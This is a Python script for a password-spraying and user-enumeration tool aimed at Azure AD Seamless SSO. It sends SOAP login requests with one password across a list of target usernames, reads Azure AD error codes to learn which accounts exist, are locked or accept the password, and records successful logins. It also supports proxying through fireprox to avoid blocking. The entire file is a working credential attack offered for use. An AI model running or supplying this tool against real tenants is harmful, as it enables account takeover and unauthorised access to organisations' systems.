#!/usr/bin/env python

import requests
import sys
import argparse
import uuid
from time import sleep
from string import Template

detailed_codes = {'AADSTS50034' : 'The user does not exist', 
'AADSTS50053' : 'The user exists and the correct username and password were entered, but the account is locked',
'AADSTS50056' : 'The user exists but does not have a password in Azure AD',
'AADSTS50126' : 'The user exists, but the wrong password was entered',
'AADSTS80014' : 'The user exists, but the maximum Pass-through Authentication time was exceeded' }

url_template = Template("""https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/usernamemixed?client-request-id=$uuid""")

xml_body = Template("""<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
  <s:Header>
    <a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
    <a:MessageID>urn:uuid:36a6762f-40a9-4279-b4e6-b01c944b5698</a:MessageID>
    <a:ReplyTo>
      <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
    </a:ReplyTo>
    <a:To s:mustUnderstand="1">https://autologon.microsoftazuread-sso.com/dewi.onmicrosoft.com/winauth/trust/2005/usernamemixed?client-request-id=30cad7ca-797c-4dba-81f6-8b01f6371013</a:To>
    <o:Security xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" s:mustUnderstand="1">
      <u:Timestamp u:Id="_0">
        <u:Created>2019-01-02T14:30:02.068Z</u:Created>
        <u:Expires>2019-01-02T14:40:02.068Z</u:Expires>
      </u:Timestamp>
      <o:UsernameToken u:Id="uuid-ec4527b8-bbb0-4cbb-88cf-abe27fe60977">
        <o:Username>$username@$domain</o:Username>
        <o:Password>$password</o:Password>
      </o:UsernameToken>
    </o:Security>
  </s:Header>
  <s:Body>
    <trust:RequestSecurityToken xmlns:trust="http://schemas.xmlsoap.org/ws/2005/02/trust">
      <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
        <a:EndpointReference>
          <a:Address>urn:federation:MicrosoftOnline</a:Address>
        </a:EndpointReference>
      </wsp:AppliesTo>
      <trust:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</trust:KeyType>
      <trust:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</trust:RequestType>
    </trust:RequestSecurityToken>
  </s:Body>
</s:Envelope>""")

def Spray(domain, users, password, target_url, wait, verbose, more_verbose):

	results = []

	AD_codes = detailed_codes.keys()

	if verbose or more_verbose:
		print("Targeting: " + target_url + "\n")

	headers = {'Content-Type':'text/xml'}

	for user in users:
		if more_verbose:
			print("spraying " + user + "\n")
		xml_data = xml_body.substitute(username=user, domain=domain, password=password)
		r = requests.post(target_url, data=xml_data)
	
		if more_verbose:
			print("Status: " + str(r.status_code) + "\n")

		if 'ThrottleStatus' in r.headers.keys():
			print("Throttling detected => ThrottleStatus: " + r.headers('ThrottleStatus'))

		if 'IfExistsResult' in r.content.decode('UTF-8'):
			print(r.content)
			sys.exit()
		
		if r.status_code == 200:
			results.append([user + '@' + domain, 'Success', password])
			if verbose:
				print("\n" + user + "@" + domain + "\t\t:: " + password)
			continue

		for code in AD_codes:
			if code in r.content.decode('UTF-8'):
				results.append([user + "@" + domain, code, ''])
				if more_verbose:
					print("\n" + user + "@" + domain + "\t\t:: " + detailed_codes[code])
				break
		sleep(wait)
		
	return results


def ProcessResults(results, outfile):
	
	for result in results:
		if result[1] == 'Success':
			outfile.write(result[0] + "\t\t:: " + result[1] + "\n")
		else:
			continue

	for result in results:
		if result[1] == 'Success':
			continue
		else:
			outfile.write(result[0] + "\t\t-- " + result[1] + " -- " + detailed_codes[result[1]] + "\n")


def main():

	parser = argparse.ArgumentParser(description="Enumerate users or password spray against Azure AD Seamless SSO")

	target_group = parser.add_argument_group(title="Attack Target")
	target_group.add_argument('-d', dest='domain', type=str, help='Target domain - required')
	target_group.add_argument('-l', dest='user_list', type=argparse.FileType('r'), help='File with list of target usernames (without domain)')
	target_group.add_argument('-u', '--url', type=str, dest='url', help='Target URL if using something like fireprox; otherwise will directly call the Azure AD SeamlessSSO endpoint')
	target_group.add_argument('-w', '--wait', type=int, dest='wait', help='Number of seconds to sleep between individual user attempts', default=0)

	password_group = parser.add_argument_group(title="Password Group")
	password_group.add_argument('-p', '--password', type=str, dest='password', default='notarealpassword,Iswear', help='password to spray. Defaults to "notarealpassword,Iswear".')
  
	parser.add_argument('-v', '--verbose', action='store_true', dest='verbose', default=False)
	parser.add_argument('-vv', '--more-verbose', action='store_true', dest='more_verbose', default=False)

	parser.add_argument('-o', '--output', type=argparse.FileType('w'), dest='output_file', default='spray_results.csv', help='Output file for results (csv). Default is spray_results.csv')

	args = parser.parse_args()

	if not args.domain:
		parser.print_help()
		print('\nNo target domain provided')
		sys.exit()

	if not args.user_list:
		parser.print_help()
		print('\nNo list of target users provided')
		sys.exit()

	if not args.url:
		target_url = url_template.substitute(domain = args.domain, uuid = uuid.uuid4())
	else:
		target_url = args.url

	output_file = args.output_file
	
	users = []

	for line in args.user_list:
		users.append(line.split('@')[0].strip())
		

	results = Spray(args.domain, users, args.password, target_url, args.wait, args.verbose, args.more_verbose)	

	ProcessResults(results, args.output_file)


if __name__ == '__main__':
	main()
